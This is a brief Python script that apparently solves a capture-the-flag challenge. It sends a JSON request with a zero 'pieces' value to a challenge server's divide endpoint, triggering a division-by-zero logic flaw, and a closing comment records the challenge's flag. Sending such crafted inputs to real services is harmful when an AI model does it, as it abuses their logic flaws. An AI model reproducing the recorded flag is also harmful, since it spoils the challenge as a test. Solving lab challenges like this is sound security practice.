import requests


site = "http://dividifacile.challs.olicyber.it"
data = {"amount" : "1",
        "pieces" : "0"}

r = requests.post(f"{site}/divide", json = data).text
print(r)

#ITASEC{j4v4scr1pt_do35_s0m3_5tup1d_5tuff}